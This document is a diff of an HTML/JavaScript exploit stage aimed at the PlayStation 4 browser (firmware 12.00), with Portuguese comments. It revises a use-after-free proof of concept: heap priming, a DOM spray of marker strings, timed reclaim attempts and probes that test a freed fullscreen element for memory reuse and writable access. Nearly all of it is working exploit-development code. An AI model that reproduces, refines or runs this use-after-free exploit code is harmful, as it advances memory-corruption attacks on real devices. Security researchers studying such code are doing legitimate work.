@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Type Confusion Stage</title>
+<title>PS4 12.00 - UAF Precision Stage</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → Type Confusion</h2>
+<h2>UAF Precision (1 Array Required)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -21,17 +21,19 @@ function log(msg){
 }
 
 // ==========================
-// HEAP SETUP (mantido)
+// 💣 HEAP PRIMING (CRÍTICO)
 // ==========================
 function setupHeap(){
-    for(let i=0;i<5000;i++){
-        let t=new Float64Array(8);
-        t[0]=i;
-    }
+    let t = new Float64Array(8);
+    t[0] = 0x1337;
+
+    window.__priming_array = t;
+
+    log("[*] heap primed (1 array)");
 }
 
 // ==========================
-// FULLSCREEN (inalterado)
+// FULLSCREEN (INALTERADO)
 // ==========================
 function setupFullscreen(){
 
@@ -56,52 +58,32 @@ function setupFullscreen(){
 }
 
 // ==========================
-// 💣 CONFUSION RECLAIM
+// 💣 RECLAIM PRECISO
 // ==========================
-function confusionReclaim(size){
+function preciseReclaim(size){
 
-    log("[*] Confusion reclaim = "+size);
+    log("[*] Reclaim size = "+size);
 
     let bucket=[];
 
-    // churn inicial
-    for(let i=0;i<3000;i++){
+    // churn leve (mantido)
+    for(let i=0;i<2000;i++){
         let el=document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
+    // spray controlado
     for(let i=0;i<size;i++){
 
-        let el;
+        let el=document.createElement("div");
 
-        switch(i % 4){
+        el.innerHTML =
+            "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+"_41414141_42424242_43434343</h1>";
 
-            case 0:
-                el=document.createElement("div");
-                el.innerHTML =
-                    "<h1>CTRL_"+i+"_41414141</h1>";
-                break;
-
-            case 1:
-                el=document.createTextNode(
-                    "TXT_"+i+"_BBBBBBBBBBBBBBBBBBBB"
-                );
-                document.body.appendChild(el);
-                bucket.push(el);
-                continue;
-
-            case 2:
-                el=document.createElement("svg");
-                el.innerHTML =
-                    "<circle cx='10' cy='10' r='5'></circle>";
-                break;
-
-            case 3:
-                el=document.createElement("div");
-                el.setAttribute("data-x","ATTR_"+i);
-                break;
-        }
+        el.style.position="absolute";
+        el.style.width="100%";
+        el.style.height="100%";
 
         document.body.appendChild(el);
         bucket.push(el);
@@ -111,70 +93,66 @@ function confusionReclaim(size){
 }
 
 // ==========================
-// 🔬 TYPE CONFUSION PROBE
+// 🔬 PROBE AVANÇADO
 // ==========================
-function typeProbe(fsTarget){
+function deepProbe(fsTarget){
 
-    log("---- TYPE PROBE ----");
+    log("---- PROBE ----");
 
     try{
+        let html = fsTarget.innerHTML;
+        log("[CHECK] innerHTML = "+html);
 
-        let node = fsTarget.firstChild;
-
-        if(!node){
-            log("[!] sem child");
-            return;
-        }
-
-        log("[CHECK] node = "+node);
-        log("[CHECK] nodeType = "+node.nodeType);
-
-        let isHTML = node instanceof HTMLElement;
-        let isSVG  = node instanceof SVGElement;
-
-        log("[CHECK] HTMLElement = "+isHTML);
-        log("[CHECK] SVGElement = "+isSVG);
-
-        // 🔥 DETECÇÕES IMPORTANTES
-        if(node.nodeType === 3){
-            log("[!!!] TEXTNODE REUSE");
-        }
-
-        if(isHTML && isSVG){
-            log("[!!!] TYPE CONFUSION REAL");
-        }
-
-        // 🔥 tentativa de escrita
-        try{
-            node.innerHTML = "<b>AAAA</b>";
-            log("[PWN] innerHTML write OK");
-        }catch(e){
-            log("[UAF] innerHTML crash");
-        }
-
-        // 🔥 acesso de layout (quebra comum)
-        try{
-            let r=node.getBoundingClientRect();
-            log("[CHECK] rect = "+r.height);
-        }catch(e){
-            log("[UAF] rect crash");
-        }
-
-        // 🔥 leitura suspeita
-        try{
-            let v=node.textContent || node.nodeValue;
-            log("[LEAK?] data = "+v);
-
-            if(v && v.includes("4141")){
-                log("[!!!] POSSIVEL LEAK");
-            }
-
-        }catch(e){
-            log("[LEAK] crash");
+        if(html && html.includes("CTRL_")){
+            log("[!!!] REUSE VISUAL DETECTADO");
         }
 
     }catch(e){
-        log("[CRASH] type probe");
+        log("[UAF] innerHTML crash");
+    }
+
+    try{
+        let text = fsTarget.textContent;
+        log("[CHECK] textContent = "+text);
+    }catch(e){
+        log("[UAF] textContent crash");
+    }
+
+    try{
+        let child = fsTarget.firstChild;
+        log("[CHECK] child = "+child);
+
+        if(child){
+            log("[CHECK] nodeType = "+child.nodeType);
+
+            if(child.nodeType === 3){
+                log("[!!!] TEXTNODE REUSE");
+            }
+        }
+
+    }catch(e){
+        log("[UAF] child crash");
+    }
+
+    try{
+        fsTarget.innerHTML = "<div>BBBBBBBBB</div>";
+        log("[PWN] write OK");
+    }catch(e){
+        log("[UAF] write crash");
+    }
+
+    try{
+        let r = fsTarget.getBoundingClientRect();
+        log("[CHECK] rect = "+r.height);
+    }catch(e){
+        log("[UAF] rect crash");
+    }
+
+    try{
+        let p = fsTarget.parentNode;
+        log("[CHECK] parent = "+p);
+    }catch(e){
+        log("[UAF] parent crash");
     }
 }
 
@@ -194,16 +172,19 @@ function trigger(fsTarget){
 
     }catch(e){}
 
-    // 🔥 múltiplos reclaim com tipos mistos
-    setTimeout(()=>confusionReclaim(2000), 0);
-    setTimeout(()=>confusionReclaim(2500), 50);
-    setTimeout(()=>confusionReclaim(3000), 100);
+    // 🔥 faixa refinada (IMPORTANTE)
+    let sizes = [1800, 2000, 2200];
 
-    // 🔬 probes
-    setTimeout(()=>typeProbe(fsTarget), 30);
-    setTimeout(()=>typeProbe(fsTarget), 90);
-    setTimeout(()=>typeProbe(fsTarget), 160);
-    setTimeout(()=>typeProbe(fsTarget), 240);
+    sizes.forEach((size, idx)=>{
+        setTimeout(()=>preciseReclaim(size), idx*60);
+    });
+
+    // 🔬 probes mais agressivos
+    setTimeout(()=>deepProbe(fsTarget), 10);
+    setTimeout(()=>deepProbe(fsTarget), 30);
+    setTimeout(()=>deepProbe(fsTarget), 60);
+    setTimeout(()=>deepProbe(fsTarget), 120);
+    setTimeout(()=>deepProbe(fsTarget), 200);
 
     // 📜 log final
     setTimeout(()=>{
@@ -220,9 +201,9 @@ function runTest(){
 
     log("[*] Iniciando teste");
 
-    setupHeap();
+    setupHeap(); // 💣 ESSENCIAL (1 array)
 
-    let fsTarget=setupFullscreen();
+    let fsTarget = setupFullscreen();
 
     window.onblur=function(){
         log("[*] onblur");
